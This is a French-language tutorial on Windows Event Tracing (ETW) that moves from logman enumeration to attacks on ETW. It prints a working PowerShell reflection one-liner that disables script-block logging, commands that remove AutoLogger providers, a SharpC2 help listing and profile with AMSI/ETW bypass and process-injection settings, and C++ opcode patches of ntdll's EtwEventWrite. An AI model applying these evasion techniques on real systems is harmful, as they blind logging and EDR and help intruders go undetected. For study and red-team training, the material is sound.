Prérequis :

- Connaitres la programmation applicative low-level.
- Connaitre un minimum l'architecture de Windows

# Qu'est ce que l'ETW ? 


ETW  ( Event Tracing for Windows ) va permettres de faire du suivi d'événements sur une applications programmer pour en stockant les événements de l’utilisateur ou du noyau dans des logs. il est possible de visionner ces logs plus tard ou en temps réel. l'ETW fais parti intégrant de Windows Performance Toolkit (WPT), WPT c'est ce qui comportes la plupart des outils de surveillance sur Windows. ETW est également utilisé lors des déploiement d'EDR.

Quand une session ETW est ouverte pour l'écoute d'évenement, l'ensembles des evenements sont stocké dans un fichier appelé Event Trace Log (ETL)


ETW API .NET : https://www.nuget.org/packages/Microsoft.Windows.EventTracing.Processing.All

ETW utilise le WPA et WPR pour géré et présenté les évenement de facon propre. WPA ( Windows Performance Analyzer ) va consulter les fichiers ETL produits par les applications active (Provider) d'une session ETW pour créer des graphiques et tableau, afin que le rendu soit propre.

WPR (Windows Performance Recorder) lui, agit en tant que contrôleur de session, c'est lui qui va démarrer et arrêter la session et peux sélectionner les événements ETW à enregistrer. des fichiers WPRP peuvent etre créer pour créer des profiles personnalisé, afin de pouvoir démarrer des sessions ETW en suivant des évenements très précis.


![](https://media.discordapp.net/attachments/713142876241920000/936061596755701780/unknown.png?width=838&height=609)


[Création de profils d’enregistrement | Documents Microsoft](https://docs.microsoft.com/en-us/windows-hardware/test/wpt/authoring-recording-profiles)
[WPT Mise en route | Documents Microsoft](https://docs.microsoft.com/en-us/windows-hardware/test/wpt/wpt-getting-started-portal)
[Event Tracing - Win32 apps | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal)


### ETW Logman Enumeration :

Logman est un outil permettant aux utilisateurs windows de voir quel sessions ETW sont actives ainsi que les providers de ses logs.

ici, vous pouvez voir tout les providers actifs du powershell comme l'AMSI :

```powershell
PS> tasklist | findstr powershell
PS> logman query providers -pid <pid>
PS> logman query providers # ici on listera tout les providers sans exceptions
```
![](https://media.discordapp.net/attachments/713142876241920000/936061907746566234/unknown.png)

si vous souhaitez supprimé tout les providers actif venant de l'AutoLogger :
```powershell
PS> Remove-EtwTraceProvider -AutologgerName EventLog-Application -Guid {GUID}
```
Un AutoLogger est une Trace Session qui enregistre les événements des provider en kernel mode et en user mode.

désactiver l'ETW (logging ScriptBlock) :
```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

pour lister toute les sessions ETW, exectuez cette commande.
```powershell
PS> logman -ets
```

###### EVENT_ENABLE_PROPERTY_IGNORE_KEYWORD_0 :


```powershell
Set-EtwTraceProvider -Guid {GUID} -AutologgerName 'EventLog-Application' -Property 0x11
```

cela permet de ne pas faire apparaitre les évenements ayant la valeur KEYWORD 0


#### Attaques contre l'ETW : 

differentes méthodes d'attaques contre ETW :

![](https://media.discordapp.net/attachments/713142876241920000/936061629181861948/unknown.png?width=1319&height=609)

-  __*rouge*__ : montre les attaques contre ETW de l’intérieur d’un processus mailicieux.
-   __*bleu clair*__ : montre les attaques sur ETW en modifiant les variables d’environnement, le registre et les fichiers
-   __*Orange*__ : montre des attaques contre les providers ETW en user mode
-   __*Bleu foncé*__ : montre les attaques contre les providers ETW en kernel mode
-   __*Violet*__ : montre des attaques sur les sessions ETW.

le nombre totals d'attaques possibles contre ETW serait de 36 mais Dans ce cours, nous verrons justes les attaques rouges, orange et bleu clair.
Certaines opérations Offensive (Red Team) on utilisé des techniques d'attaques contre ETW, exemple APT42 à désactivé l'ETW, APT Slingshot à renommé les ETL pour ne pas laisser de traces et le ransomware lockerGoga à désactiver ETW pour bypass les host-based sensors comme les HIDS, HIPS...

certains C2 on implémenté des fonctions pour bypass ETW, exemple SharpC2 :
```apm
[drones] > interact a47153bd55 
[a47153bd55] > help 
Name           Description 
----           ----------- 
abort            Abort a running task 
back             Go back to the previous screen 
bypass           Set a directive to bypass AMSI/ETW on tasks 
cat              Read a file as text 
cd               Change working directory 
execute-assembly Execute a .NET assembly 
exit             Exit this Drone
```
une fois que vous avez compromis la victime, vous pouvez intéragir avec le drone, *bypass* Indique au drone s'il doit ou non tenter de contourner AMSI et/ou ETW lors de l'exécution de commandes post-exp. Le drone utilise la bibliothèque MinHook.NET intégrée pour connecter amsi.dll!AmsiScanBuffer et ntdll.dll!EtwEventWrite.

###### Post-Exploitation Custom C2Profile, Bypass AMSI/ETW :

SharpC2 utilise des profils C2 pour personnaliser certaines actions. Les profils sont au format YAML et comportent 3 key/objects, Stage, PostExploitation et ProcessInjection.
```yaml
Stage: 
   SleepTime: 5 
   SleepJitter: 0 
   DllExport: Execute 
   SendStandardApi: true 
PostExploitation: 
   BypassAmsi: false 
   BypassEtw: false 
   SpawnTo: C:\Windows\System32\notepad.exe 
   AppDomain: SharpC2 
ProcessInjection: 
   Allocation: NtWriteVirtualMemory 
   Execution: RtlCreateUserThread
```

les valeurs BypassAmsi/BypassEtw indiquent au drone s'il doit ou non tenter de contourner l'AMSI et l'ETW lors des tâches post-ex. on peux
également l'utiliser pendant l'exécution avec la commande bypass.


###### ETW EtwEventWrite Patching :
![](https://media.discordapp.net/attachments/713142876241920000/936061204013649930/unknown.png)
on peux faire ce qu'on appelle du Function patching avec l'instruction RET.

ce code permet de désactiver le suivi d'évenement ETW en user-mode,
NTDLL est la couche la plus base du User-Mode. NTDLL comportes une grande listes de Fonctions utilisés pour le bon fonctionnement de Windows dans differentes versions de microprocesseur (x86, x64, wow64...). NTDLL comporte notamment la fonction `EtwEventWrite`.

La fonction EtwEventWrite est responsable de l’écriture d’événements dans une session. vu que *EtwEventWrite* fonctionne en user-mode, un attaquant peux bypass l'ETW.  la fonction se termine normalement par `ret 0x14`

vu que le Suivi D'événements ce termine par `EtwEventWrite` pour écrire les événements,  Si on réecris le même code assembleur au début de la Fonction `EtwEventWrite()` aucun évenement ne seras enregistré.

![](https://media.discordapp.net/attachments/713142876241920000/936061052997742634/unknown.png)

dans ce code ci dessus nous récupérons l'adresse de la fonction *EtwEventWrite* depuis NTDLL et on modifie les autorisations de ce segment mémoire avec VirtualProtect() en définissant les perms RWX (Read Write Exec)
et memcpy sera utilisé pour copier l’opcode pour un retour dans la mémoire tampon.


![](https://media.discordapp.net/attachments/713142876241920000/936061139421388810/unknown.png)
(64 bits)
vous pouvez voir que la valeur de retour est `c3` (\xc3) et donc `\x48\x33\xc0` c'est l'application de *XOR* sur le registre *rax* pour tout clear.

dans l'autre suite d'opcode (32 bits) , `\x33\xc0\xc2\x14\x00`, 
![](https://media.discordapp.net/attachments/713142876241920000/936062970167980053/unknown.png)

vous pouvez voir que la valeur de retour est c21400 soit `\xc2\x14\x0`" pour `ret 14h` et `\x33\xc0` pour *xor* le registre *EAX*

on peux aussi utiliser les préprocesseurs `#ifdef`, `#else`,`#endif` si on veux adapter les opcode suivants les versions.
```cpp
#ifdef _WIN64
        memcpy(addr, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
#else
        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
#endif
```

résultat:

![](https://media.discordapp.net/attachments/713142876241920000/936060824869539950/unknown.png)
